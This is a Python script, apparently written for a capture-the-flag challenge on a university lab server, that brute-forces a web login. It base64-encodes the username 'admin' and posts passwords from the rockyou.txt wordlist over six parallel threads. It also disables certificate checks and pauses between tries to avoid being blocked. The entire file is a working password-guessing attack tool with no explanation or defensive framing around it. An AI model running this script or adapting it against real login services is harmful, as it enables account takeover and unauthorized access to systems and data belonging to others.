import base64
import json
import requests
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading

# Configuración
url = 'https://gorila.dsa.linti.unlp.edu.ar/login'   # ⚠️ Cambiar por la URL real del reto
usuario_original = 'admin'           # ⚠️ Cambiar por el usuario objetivo
diccionario_path = 'rockyou.txt'     # Ruta al diccionario
num_hilos = 6                       # 🔧 Número de hilos paralelos
start_line = 0                       # 🔧 Línea del diccionario para empezar

# Codificamos el usuario en base64 como hace btoa()
usuario_codificado = base64.b64encode(usuario_original.encode()).decode()

# Variable global para detener todos los hilos si se encuentra la contraseña
found = threading.Event()

def probar_contraseña(password):
    if found.is_set():
        return None  # Si ya se encontró, salimos

    password = password.strip()
    payload = {
        'username': usuario_codificado,
        'password': password
    }

    headers = {
        'Content-Type': 'application/json'
    }

    try:
        response = requests.post(
            url,
            headers=headers,
            data=json.dumps(payload),
            verify=False,  # Ignorar problemas con el certificado SSL
            timeout=5
        )

        if response.status_code == 200:
            data = response.json()
            print(f"\n[+] ¡Éxito! Contraseña encontrada: {password}")
            print(f"Mensaje del servidor: {data.get('message')}")
            found.set()  # Detener otros hilos
            return password
        else:
            error_detail = response.json().get('detail', 'Respuesta no esperada')
            print(f"[-] {password} - {error_detail}")

    except Exception as e:
        print(f"[!] Error con contraseña {password}: {e}")

    time.sleep(0.3)  # Ralentiza un poco para evitar bloqueo
    return None

# Leer diccionario desde línea específica
with open(diccionario_path, 'r', encoding='latin-1') as f:
    lineas = f.readlines()[start_line:]

# Ejecutar pruebas en paralelo
with ThreadPoolExecutor(max_workers=num_hilos) as executor:
    futuros = {executor.submit(probar_contraseña, pwd): pwd for pwd in lineas}

    for future in as_completed(futuros):
        resultado = future.result()
        if resultado:
            break  # Ya se encontró la contraseña correcta